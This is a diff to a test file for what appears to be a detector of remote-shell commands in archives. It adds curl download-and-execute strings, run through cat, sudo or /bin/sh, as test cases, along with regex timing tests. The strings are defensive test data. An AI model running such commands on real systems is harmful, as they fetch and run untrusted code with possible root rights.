@@ -5,7 +5,7 @@ import { describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import { analyze, finalize, SCORE_FLOOR, type AnalyzeInput, type TarEntry } from "../src/index.ts";
-import { slowOn } from "./fixtures/regex-timing.ts";
+import { ms, slowOn } from "./fixtures/regex-timing.ts";
 
 function entry(path: string, text: string): TarEntry {
   const data = new TextEncoder().encode(text);
@@ -91,6 +91,10 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `curl -fsSL ${URL} 2>&1 | tee /tmp/l | sh`,
     `curl -fsSL ${URL} &>/dev/null | bash`,
     `curl "https://example.invalid/x?pad=${"a".repeat(240)}" | bash`,
+    // the saved file run through a path or sudo
+    `curl -s ${URL} -o /tmp/p; /bin/cat /tmp/p | sh`,
+    `curl -s ${URL} -o /tmp/p && sudo cat /tmp/p | sh`,
+    `curl -s ${URL} -o /tmp/p; sudo /bin/sh /tmp/p`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -170,5 +174,11 @@ describe("the rule reads hostile text in linear time", () => {
     const units = ["x=|", "x=;", ";a=b", "|sudo -u x", "|env -ix=", "curl x|env a=", "|sudo --user="];
 
     expect(slowOn("REMOTE_SHELL", re, (_re, n) => units.map((u) => u.repeat(Math.ceil(n / u.length)).slice(0, n)), 64_000)).toEqual([]);
+  });
+
+  test("redirect characters that could be read two ways do not make it exponential", () => {
+    // `>&>` once read as `>&` + `>` or `>` + `&>`; 40 triples would take hours if each doubled the paths
+    expect(ms(re, `curl ${">&>".repeat(40)}`)).toBeLessThan(100);
+    expect(ms(re, `curl ${"&>&".repeat(40)} x`)).toBeLessThan(100);
   });
 });
